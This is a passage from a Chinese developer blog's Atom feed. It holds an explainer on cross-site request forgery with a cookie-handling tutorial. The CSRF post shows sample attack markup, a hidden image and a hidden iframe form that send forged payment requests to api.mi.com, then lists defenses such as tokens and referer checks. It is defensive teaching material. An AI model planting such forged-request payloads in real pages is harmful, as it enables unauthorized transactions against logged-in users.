rel="noopener">https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open</a></p><p><a href="https://github.com/sindresorhus/devtools-detect" target="_blank" rel="noopener">https://github.com/sindresorhus/devtools-detect</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JS并没有直接提供判断检测用户是否打开devtool的API。&lt;br&gt;思考下，打开控制台有哪些特征呢？&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="https://evacoder.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>「 安全 」这次，完全弄明白CSRF</title>
    <link href="https://evacoder.com/2018/12/20/crsf/"/>
    <id>https://evacoder.com/2018/12/20/crsf/</id>
    <published>2018-12-20T12:11:15.000Z</published>
    <updated>2019-05-13T06:06:35.905Z</updated>
    
    <content type="html"><![CDATA[<p>今天听小伙伴分享了下CSRF攻击的原理，这次真的弄明白了CSRF。<br><strong>CSRF(</strong>Cross Site Request Forgery) 是什么？跨站请求伪造。</p><p>通过CSRF攻击，坏人可以冒用你的身份（登录态）来做任何事情。因为登录态一般都是通过cookie来存储在浏览器中，要知道即使只是发起一个图片的请求，也会带上这个域下的所有cookie，可以做到用户完全无感知的情况下发起用户不想发出的请求。<br><a id="more"></a></p><h4 id="为啥钱被转走了"><a href="#为啥钱被转走了" class="headerlink" title="为啥钱被转走了"></a>为啥钱被转走了</h4><p>假设mi有个付钱的接口是 <code>api.mi.com/pay?money=10000&amp;x=xx</code></p><p>要知道一般登录态（serviceToken）都是存在浏览器的cookie中，有的有效期还很长，如果有一个坏人的页面<code>badman.com</code>，页面中加载一个看不见的小图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">wwww.mi.com/pay?money</span>=<span class="string">10000</span> <span class="attr">style</span>=<span class="string">"display:none"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>只要我们访问这个页面，就会在我们不知情的情况下自动发请求 <code>api.mi.com/pay?money=10000</code>出去，虽然只是一个图片，一样会带上存在你浏览器中的 <code>mi.com</code>下的所有的cookie，如果这时候你已经登录了mi网，这个请求就轻松的得到了你的登录态，向服务器发出了付款的请求。坏人setInterval每秒发个请求，你的钱就哗哗的全被转走了。</p><p>一般作恶的核心是<strong>跨域</strong>，所以浏览器对于跨域有很多限制。</p><p>但是我们都知道这种通过ping img 图片跨域的方式发起的是<strong>get请求</strong>，只管请求发出去，而不管响应。<br>get请求一般只是读取操作，像付款这种写操作如果还使用get请求，第一步就被人吃干抹净，所以在接口设计中一定要注意。<br>现在我们将 <code>api.mi.com/pay?money=10000</code> 升级为post请求，如果有坏人访问就统统405，现在就可以高枕无忧了吗？</p><p><strong>post请求可以跨域吗？</strong></p><p>ajax有跨域限制，但是通过form表单的方式，post请求一样可以跨域，再加上放在iframe里，还可以不跳转页面就发送表单post请求，用户毫无感知钱就被转走了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span>　<span class="attr">action</span>=<span class="string">"http://api.mi.com"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"other"</span> <span class="attr">value</span>=<span class="string">"XXX"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"10000"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="防御CRSF"><a href="#防御CRSF" class="headerlink" title="防御CRSF"></a>防御CRSF</h4><ul><li>删改查操作使用post method是基础。</li><li><p>一般的做法是随着登录态下发一个 <code>crsf_token</code>，在之后所有post操作中都要求带上这个 <code>crsf_token</code>，axios有这个功能，不需要我们手动每次添加。 这种做法的原理是在坏人的页面中，虽然可以自动带上被攻击网站的cookie，但是他的代码在 <code>badman.com</code> 下，因为cookie的同源策略，他通过js是无法获取在mi.com域下的crsf_token cookie放在post 请求中的，crsf_token是个随机字符串都可以达到这个效果。</p></li><li><p>也可以在敏感操作中通过后端校验refer，通过refer白名单的方式来杜绝来自坏人网站的攻击。</p></li><li><p>在非常敏感的操作中可以（最好不要）牺牲一些体验要求验证码验证，要求用户必须有交互。</p></li><li><p>最好严格下发子域的cookie，避免全站通用的cookie。</p></li></ul><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>为啥只在post请求下使用 <code>crsf_token</code>呢？</p><p>之前回答post和get的区别的时候都回答的很浅，但是在这个场景下，安全无小事，你就能理解两者的区别了。</p><p>get请求你要加 <code>crsf_token</code>其实也没问题吧，只不过一般get请求是读取操作，不会修改服务器数据，一般没啥影响，不加验证也还好，毕竟加token会影响性能。一个合格的后端开发应该不会用get请求来敏感操作的，如果有，你可以教训教训他。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天听小伙伴分享了下CSRF攻击的原理，这次真的弄明白了CSRF。&lt;br&gt;&lt;strong&gt;CSRF(&lt;/strong&gt;Cross Site Request Forgery) 是什么？跨站请求伪造。&lt;/p&gt;
&lt;p&gt;通过CSRF攻击，坏人可以冒用你的身份（登录态）来做任何事情。因为登录态一般都是通过cookie来存储在浏览器中，要知道即使只是发起一个图片的请求，也会带上这个域下的所有cookie，可以做到用户完全无感知的情况下发起用户不想发出的请求。&lt;br&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://evacoder.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>「 缓存 」cookie实践指南</title>
    <link href="https://evacoder.com/2018/12/20/cookie/"/>
    <id>https://evacoder.com/2018/12/20/cookie/</id>
    <published>2018-12-20T12:11:15.000Z</published>
    <updated>2019-02-14T09:12:17.529Z</updated>
    
    <content type="html"><![CDATA[<p>HTTP是无状态的协议，cookie可以用来存储用户的信息方便追踪。<br><a id="more"></a></p><h4 id="封装cookie操作"><a href="#封装cookie操作" class="headerlink" title="封装cookie操作"></a>封装cookie操作</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> cookieName = <span class="string">`<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(name)&#125;</span>=`</span>;</span><br><span class="line">  <span class="keyword">const</span> cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName);</span><br><span class="line">  <span class="keyword">let</span> cookieValue = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</span><br><span class="line">    <span class="keyword">if</span> (cookieEnd === <span class="number">-1</span>) &#123;</span><br><span class="line">      cookieEnd = <span class="built_in">document</span>.cookie.length;</span><br><span class="line">    &#125;</span><br><span class="line">    cookieValue = <span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd);</span><br><span class="line">    cookieValue = <span class="built_in">decodeURIComponent</span>(cookieValue);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cookieValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, expires, path, domain, secure</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cookieText = <span class="string">`<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(name)&#125;</span>=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(value)&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">if</span> (expires) &#123;</span><br><span class="line">    cookieText += <span class="string">`;expires=<span class="subst">$&#123;expires.toUTCString()&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (path) &#123;</span><br><span class="line">    cookieText += <span class="string">`;path=<span class="subst">$&#123;path&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (domain) &#123;</span><br><span class="line">    cookieText += <span class="string">`;domain=<span class="subst">$&#123;domain&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (secure) &#123;</span><br><span class="line">    cookieText += <span class="string">';secure'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.cookie = cookieText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delCookie</span>(<span class="params">name, path, domain, secure</span>) </span>&#123;</span><br><span class="line">  setCookie(name, <span class="string">''</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>), path, domain, secure);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从setCookie来看，每个参数都暗藏玄机。</p><ul><li>name和value</li></ul><p>name和value自不必多说，cookie是存储的一个个键值对，name和value都需要encode之后存储，如果没有encode会怎么样呢？</p><p>在chrome中试验<code>document.cookie=&#39;%ddd=2=%#&amp;试试中文&#39;</code>依然可以设置cookie成功，读取时也可以读取到，但是为了规范存取，还是需要encode之后再读写。</p><ul><li>expires</li></ul><p>如果不设置expires，会得到<strong>session级别的cookie</strong>。一定要注意，session的定义是把<strong>整个浏览器关闭</strong>之后，这些cookie才会消失，而不是仅仅关闭所在的tab页。</p><ul><li>path</li></ul><p>如果不设置path的话，得到的cookie的path会是当前页面的path哦。比如在<code>eva.com/blog/page/1.html</code>中设置cookie，不设置path，得到的cookie的path会是<code>/blog/page/</code></p><ul><li>domain</li></ul><p>仔细观察可以发现，cookie中的domain有的是带点的比如<code>.eva.com</code>，有的是不带点的<code>eva.com</code>。它们的区别是什么？又是怎么设置成功的呢？</p><p><code>eva.com</code>和<code>.eva.com</code>的区别</p><p>cookie也符合<strong>同源策略</strong>，带点的表示子域如<code>account.eva.com</code>也可以访问，而不带点的要求严格，只能在本域名中访问。</p><p>如果不设置domain的话，就默认是当前不带点的域名。如果设置域名的话，会下发在带点的域名下，子域也可以共享cookie。</p><p>比如在<code>eva.com/blog/page/1.html</code>中设置cookie，不设置domain，得到的cookie的path会是eva.com，<code>setCookie(&#39;key&#39;,&#39;value&#39;,new Date(),&#39;/&#39;,&#39;eva.com&#39;)</code>设置了domain的话，会自动加上.变成<code>.eva.com</code>。</p><p>后端下发的cookie也同理，看是否设置域名。</p><p>带不带点需要视情况而定，看是否允许子域获取到cookie。</p><h4 id="cookie的使用场景"><a href="#cookie的使用场景" class="headerlink" title="cookie的使用场景"></a>cookie的使用场景</h4><p>1.登录态的记录</p><p>sso登录中需要用cookie来记录用户的登录态</p><p>2.已阅读标识</p><p>对于只出现一次的用户协议，我们需要一个已阅读的标识，这个时候其实可以不需要后端，前端设置一个cookie来作为已经出现过的标识。</p><p>其他待补充</p><h4 id="遇到的那些问题"><a href="#遇到的那些问题" class="headerlink" title="遇到的那些问题"></a>遇到的那些问题</h4><p>1.cookie大小的问题</p><p>有的时候后端为了全面追溯用户的状态下，发的cookie非常大，注意一般浏览器的cookie大小限制是4kb左右，保险起见最好不要超过4kb。过大的cookie会下发不成功，遇到问题不好定位。</p><p>有时候运维也会在ngnix对cookie设置大小限制，一般比4kb还小，这个时候问题就更难定位了，可以作为一个排查点。</p><p>另外过大的cookie还会造成严重的性能问题。一般没有特别做性能优化的网站js/css/img等静态资源都和接口共用一个域名，域名下如果有很多的cookie的话，每次获取静态资源时这些cookie也会带在了请求中，虽然有4kb的限制，但是还是会造成不必要的网络开销，如果条件允许，建议启动<strong>和主站不同的域名来放置静态资源</strong>。虽然采用不同的域名导致多次建立网络连接，会多耗费时间，可以权衡一下采用哪种方案。</p><p>和server端强调下最好不要下发没必要的cookie，注意cookie的大小。</p><p>2.cookie标志用户，用户切换时要注意避免cookie污染。</p><p>使用cookie进行交互时一定要注意各个用户切换时造成的问题。一定能覆盖成功才可以</p><p>3.熟练使用抓包工具避免推诿</p><p>chrome中network的追溯</p><p>一旦涉及到cookie的问题，特别是webview中的cookie，需要iOS，andriod，FE，server端一起来定位问题，这个时候非常需要一个工具来确定到底谁是罪魁祸首。熟练使用抓包工具会避免推诿，省心不少。</p><p>一定要看清楚到底是response cookie和request cookie，明确cookie是在哪个请求中下发的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HTTP是无状态的协议，cookie可以用来存储用户的信息方便追踪。&lt;br&gt;
    
    </summary>
    
    
      <category term="HTTP" scheme="https://evacoder.com/tags/HTTP/"/>
    
  </entry>
  
</feed>
